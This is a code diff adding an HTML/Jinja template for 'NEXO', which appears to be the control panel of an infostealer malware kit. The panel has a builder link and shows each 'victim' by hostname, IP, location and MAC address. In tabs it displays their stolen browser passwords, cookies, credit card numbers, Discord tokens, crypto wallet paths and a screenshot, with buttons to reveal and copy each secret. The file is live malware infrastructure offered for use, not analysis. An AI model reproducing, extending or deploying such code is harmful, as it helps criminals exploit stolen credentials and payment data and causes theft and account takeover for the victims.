@@ -1,0 +1,523 @@
+{% extends 'base.html' %}
+
+{% block title %}{{ victim.username }} - NEXO{% endblock %}
+
+{% block extra_css %}
+<style>
+    .victim-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: flex-start;
+        margin-bottom: 30px;
+    }
+
+    .victim-info {
+        display: flex;
+        align-items: center;
+        gap: 20px;
+    }
+
+    .victim-avatar {
+        width: 80px;
+        height: 80px;
+        border-radius: 20px;
+        background: linear-gradient(135deg, var(--purple-primary), var(--purple-dark));
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 32px;
+        font-weight: 700;
+    }
+
+    .victim-details h2 {
+        font-size: 28px;
+        margin-bottom: 5px;
+    }
+
+    .victim-details .meta {
+        display: flex;
+        gap: 20px;
+        color: var(--text-secondary);
+        font-size: 14px;
+    }
+
+    .info-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+        gap: 20px;
+        margin-bottom: 30px;
+    }
+
+    .info-card {
+        background: var(--bg-card);
+        border: 1px solid var(--border-color);
+        border-radius: 15px;
+        padding: 20px;
+    }
+
+    .info-card h4 {
+        color: var(--text-secondary);
+        font-size: 12px;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+        margin-bottom: 10px;
+    }
+
+    .info-card .value {
+        font-size: 16px;
+        font-weight: 500;
+        word-break: break-all;
+    }
+
+    .tabs {
+        display: flex;
+        gap: 10px;
+        margin-bottom: 20px;
+        border-bottom: 1px solid var(--border-color);
+        padding-bottom: 15px;
+    }
+
+    .tab-btn {
+        padding: 10px 20px;
+        background: transparent;
+        border: none;
+        color: var(--text-secondary);
+        cursor: pointer;
+        border-radius: 10px;
+        transition: all 0.2s;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+    }
+
+    .tab-btn:hover {
+        background: var(--bg-hover);
+        color: var(--text-primary);
+    }
+
+    .tab-btn.active {
+        background: var(--purple-primary);
+        color: white;
+    }
+
+    .tab-content {
+        display: none;
+    }
+
+    .tab-content.active {
+        display: block;
+    }
+
+    .data-table {
+        width: 100%;
+        border-collapse: collapse;
+    }
+
+    .data-table th, .data-table td {
+        padding: 12px 15px;
+        text-align: left;
+        border-bottom: 1px solid var(--border-color);
+    }
+
+    .data-table th {
+        background: var(--bg-secondary);
+        font-weight: 500;
+        font-size: 12px;
+        text-transform: uppercase;
+        color: var(--text-secondary);
+    }
+
+    .data-table tr:hover {
+        background: var(--bg-hover);
+    }
+
+    .password-cell {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+    }
+
+    .password-hidden {
+        font-family: monospace;
+        letter-spacing: 2px;
+    }
+
+    .reveal-btn {
+        background: none;
+        border: none;
+        color: var(--text-secondary);
+        cursor: pointer;
+        padding: 5px;
+    }
+
+    .reveal-btn:hover {
+        color: var(--purple-light);
+    }
+
+    .screenshot-container {
+        text-align: center;
+    }
+
+    .screenshot-container img {
+        max-width: 100%;
+        border-radius: 15px;
+        border: 1px solid var(--border-color);
+    }
+
+    .token-card {
+        background: var(--bg-secondary);
+        border: 1px solid var(--border-color);
+        border-radius: 12px;
+        padding: 20px;
+        margin-bottom: 15px;
+    }
+
+    .token-card .token-value {
+        font-family: monospace;
+        font-size: 12px;
+        word-break: break-all;
+        background: var(--bg-primary);
+        padding: 10px;
+        border-radius: 8px;
+        margin-top: 10px;
+    }
+</style>
+{% endblock %}
+
+{% block content %}
+<div class="sidebar">
+    <div class="logo">
+        <h1><i class="fas fa-bolt"></i> <span>NEXO</span></h1>
+    </div>
+    <ul class="nav-menu">
+        <li class="nav-item">
+            <a href="{{ url_for('dashboard') }}" class="nav-link">
+                <i class="fas fa-home"></i>
+                <span>Dashboard</span>
+            </a>
+        </li>
+        <li class="nav-item">
+            <a href="{{ url_for('builder') }}" class="nav-link">
+                <i class="fas fa-hammer"></i>
+                <span>Builder</span>
+            </a>
+        </li>
+        <li class="nav-item">
+            <a href="{{ url_for('settings') }}" class="nav-link">
+                <i class="fas fa-cog"></i>
+                <span>Settings</span>
+            </a>
+        </li>
+        <li class="nav-item">
+            <a href="{{ url_for('logout') }}" class="nav-link">
+                <i class="fas fa-sign-out-alt"></i>
+                <span>Logout</span>
+            </a>
+        </li>
+    </ul>
+</div>
+
+<main class="main-content">
+    <div class="victim-header">
+        <div class="victim-info">
+            <div class="victim-avatar">{{ victim.username[0].upper() if victim.username else '?' }}</div>
+            <div class="victim-details">
+                <h2>{{ victim.username or 'Unknown User' }}</h2>
+                <div class="meta">
+                    <span><i class="fas fa-desktop"></i> {{ victim.hostname or 'Unknown' }}</span>
+                    <span><i class="fas fa-globe"></i> {{ victim.public_ip or 'Unknown' }}</span>
+                    <span><i class="fas fa-map-marker-alt"></i> {{ victim.country or '' }} {{ victim.city or '' }}</span>
+                </div>
+            </div>
+        </div>
+        <div>
+            <a href="{{ url_for('dashboard') }}" class="btn btn-secondary">
+                <i class="fas fa-arrow-left"></i> Back
+            </a>
+        </div>
+    </div>
+
+    <!-- System Info -->
+    <div class="info-grid">
+        <div class="info-card">
+            <h4>Operating System</h4>
+            <div class="value">{{ victim.os_info or 'Unknown' }}</div>
+        </div>
+        <div class="info-card">
+            <h4>CPU</h4>
+            <div class="value">{{ victim.cpu or 'Unknown' }}</div>
+        </div>
+        <div class="info-card">
+            <h4>Local IP</h4>
+            <div class="value">{{ victim.local_ip or 'Unknown' }}</div>
+        </div>
+        <div class="info-card">
+            <h4>MAC Address</h4>
+            <div class="value">{{ victim.mac_address or 'Unknown' }}</div>
+        </div>
+        <div class="info-card">
+            <h4>ISP</h4>
+            <div class="value">{{ victim.isp or 'Unknown' }}</div>
+        </div>
+        <div class="info-card">
+            <h4>Captured</h4>
+            <div class="value">{{ victim.created_at.strftime('%Y-%m-%d %H:%M:%S') }}</div>
+        </div>
+    </div>
+
+    <!-- Data Tabs -->
+    <div class="table-container" style="padding: 20px;">
+        <div class="tabs">
+            <button class="tab-btn active" data-tab="passwords">
+                <i class="fas fa-key"></i> Passwords ({{ passwords|length }})
+            </button>
+            <button class="tab-btn" data-tab="cookies">
+                <i class="fas fa-cookie"></i> Cookies ({{ cookies|length }})
+            </button>
+            <button class="tab-btn" data-tab="cards">
+                <i class="fas fa-credit-card"></i> Cards ({{ credit_cards|length }})
+            </button>
+            <button class="tab-btn" data-tab="tokens">
+                <i class="fab fa-discord"></i> Tokens ({{ discord_tokens|length }})
+            </button>
+            <button class="tab-btn" data-tab="wallets">
+                <i class="fab fa-bitcoin"></i> Wallets ({{ wallets|length }})
+            </button>
+            <button class="tab-btn" data-tab="screenshot">
+                <i class="fas fa-image"></i> Screenshot
+            </button>
+        </div>
+
+        <!-- Passwords Tab -->
+        <div id="passwords" class="tab-content active">
+            {% if passwords %}
+            <table class="data-table">
+                <thead>
+                    <tr>
+                        <th>Browser</th>
+                        <th>URL</th>
+                        <th>Username</th>
+                        <th>Password</th>
+                        <th>Actions</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for pwd in passwords %}
+                    <tr>
+                        <td><span class="badge badge-info">{{ pwd.browser }}</span></td>
+                        <td style="max-width: 200px; overflow: hidden; text-overflow: ellipsis;">{{ pwd.url }}</td>
+                        <td>{{ pwd.username }}</td>
+                        <td>
+                            <div class="password-cell">
+                                <span class="password-value password-hidden" data-password="{{ pwd.password }}">••••••••</span>
+                                <button class="reveal-btn" onclick="togglePassword(this)">
+                                    <i class="fas fa-eye"></i>
+                                </button>
+                            </div>
+                        </td>
+                        <td>
+                            <button class="copy-btn" onclick="copyToClipboard('{{ pwd.password }}', this)">
+                                <i class="fas fa-copy"></i>
+                            </button>
+                        </td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+            {% else %}
+            <div class="empty-state">
+                <i class="fas fa-key"></i>
+                <h3>No passwords found</h3>
+            </div>
+            {% endif %}
+        </div>
+
+        <!-- Cookies Tab -->
+        <div id="cookies" class="tab-content">
+            {% if cookies %}
+            <table class="data-table">
+                <thead>
+                    <tr>
+                        <th>Browser</th>
+                        <th>Host</th>
+                        <th>Name</th>
+                        <th>Value</th>
+                        <th>Actions</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for cookie in cookies[:100] %}
+                    <tr>
+                        <td><span class="badge badge-info">{{ cookie.browser }}</span></td>
+                        <td>{{ cookie.host }}</td>
+                        <td>{{ cookie.name }}</td>
+                        <td style="max-width: 200px; overflow: hidden; text-overflow: ellipsis;">{{ cookie.value[:50] }}...</td>
+                        <td>
+                            <button class="copy-btn" onclick="copyToClipboard('{{ cookie.value }}', this)">
+                                <i class="fas fa-copy"></i>
+                            </button>
+                        </td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+            {% if cookies|length > 100 %}
+            <p style="text-align: center; padding: 20px; color: var(--text-secondary);">
+                Showing 100 of {{ cookies|length }} cookies
+            </p>
+            {% endif %}
+            {% else %}
+            <div class="empty-state">
+                <i class="fas fa-cookie"></i>
+                <h3>No cookies found</h3>
+            </div>
+            {% endif %}
+        </div>
+
+        <!-- Credit Cards Tab -->
+        <div id="cards" class="tab-content">
+            {% if credit_cards %}
+            <table class="data-table">
+                <thead>
+                    <tr>
+                        <th>Browser</th>
+                        <th>Name on Card</th>
+                        <th>Card Number</th>
+                        <th>Expiry</th>
+                        <th>Actions</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for card in credit_cards %}
+                    <tr>
+                        <td><span class="badge badge-warning">{{ card.browser }}</span></td>
+                        <td>{{ card.name }}</td>
+                        <td>
+                            <div class="password-cell">
+                                <span class="password-value password-hidden" data-password="{{ card.number }}">•••• •••• •••• ••••</span>
+                                <button class="reveal-btn" onclick="togglePassword(this)">
+                                    <i class="fas fa-eye"></i>
+                                </button>
+                            </div>
+                        </td>
+                        <td>{{ card.expiry }}</td>
+                        <td>
+                            <button class="copy-btn" onclick="copyToClipboard('{{ card.number }}', this)">
+                                <i class="fas fa-copy"></i>
+                            </button>
+                        </td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+            {% else %}
+            <div class="empty-state">
+                <i class="fas fa-credit-card"></i>
+                <h3>No credit cards found</h3>
+            </div>
+            {% endif %}
+        </div>
+
+        <!-- Discord Tokens Tab -->
+        <div id="tokens" class="tab-content">
+            {% if discord_tokens %}
+            {% for token in discord_tokens %}
+            <div class="token-card">
+                <div style="display: flex; justify-content: space-between; align-items: center;">
+                    <div>
+                        <span class="badge badge-danger">{{ token.source }}</span>
+                        <span class="badge badge-purple">{{ token.type }}</span>
+                    </div>
+                    <button class="copy-btn" onclick="copyToClipboard('{{ token.token }}', this)">
+                        <i class="fas fa-copy"></i> Copy Token
+                    </button>
+                </div>
+                <div class="token-value">{{ token.token }}</div>
+            </div>
+            {% endfor %}
+            {% else %}
+            <div class="empty-state">
+                <i class="fab fa-discord"></i>
+                <h3>No Discord tokens found</h3>
+            </div>
+            {% endif %}
+        </div>
+
+        <!-- Wallets Tab -->
+        <div id="wallets" class="tab-content">
+            {% if wallets %}
+            <table class="data-table">
+                <thead>
+                    <tr>
+                        <th>Wallet</th>
+                        <th>Type</th>
+                        <th>Browser</th>
+                        <th>Path</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for wallet in wallets %}
+                    <tr>
+                        <td><span class="badge badge-purple">{{ wallet.name }}</span></td>
+                        <td>{{ wallet.type }}</td>
+                        <td>{{ wallet.browser or 'N/A' }}</td>
+                        <td style="font-size: 12px; color: var(--text-secondary);">{{ wallet.path }}</td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+            {% else %}
+            <div class="empty-state">
+                <i class="fab fa-bitcoin"></i>
+                <h3>No crypto wallets found</h3>
+            </div>
+            {% endif %}
+        </div>
+
+        <!-- Screenshot Tab -->
+        <div id="screenshot" class="tab-content">
+            {% if victim.screenshot_path %}
+            <div class="screenshot-container">
+                <img src="{{ url_for('uploaded_file', filename=victim.screenshot_path) }}" alt="Screenshot">
+            </div>
+            {% else %}
+            <div class="empty-state">
+                <i class="fas fa-image"></i>
+                <h3>No screenshot available</h3>
+            </div>
+            {% endif %}
+        </div>
+    </div>
+</main>
+{% endblock %}
+
+{% block extra_js %}
+<script>
+    // Tab switching
+    document.querySelectorAll('.tab-btn').forEach(btn => {
+        btn.addEventListener('click', () => {
+            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+
+            btn.classList.add('active');
+            document.getElementById(btn.dataset.tab).classList.add('active');
+        });
+    });
+
+    // Password reveal toggle
+    function togglePassword(btn) {
+        const span = btn.previousElementSibling;
+        const password = span.dataset.password;
+
+        if (span.textContent === '••••••••' || span.textContent === '•••• •••• •••• ••••') {
+            span.textContent = password;
+            span.classList.remove('password-hidden');
+            btn.innerHTML = '<i class="fas fa-eye-slash"></i>';
+        } else {
+            span.textContent = password.includes(' ') ? '•••• •••• •••• ••••' : '••••••••';
+            span.classList.add('password-hidden');
+            btn.innerHTML = '<i class="fas fa-eye"></i>';
+        }
+    }
+</script>
+{% endblock %}
